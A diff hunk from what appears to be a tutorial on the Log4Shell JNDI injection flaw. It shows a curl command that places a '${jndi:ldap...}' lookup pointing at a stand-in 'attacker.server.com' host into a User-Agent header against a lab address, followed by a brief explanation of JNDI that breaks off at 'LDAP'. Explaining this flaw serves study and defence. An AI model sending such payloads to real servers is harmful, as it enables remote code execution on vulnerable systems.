@@ -28,3 +28,6 @@ Now we can get a little better look at what's to come. If in our request, we use
 This injected payload when triggered, gives the attacker access to execute arbitrary code. 
 
 	curl -v -H 'User-Agent: ${jndi:ldap//:attacker.server.com/payload}' '172.17.0.1:8080/'
+	
+JNDI is an independent API that gives access to directory services, bringing objects or data to the client side through information (name). Its two basic functions are to associate a name with a resource and to find a resource by its name. 
+LDAP
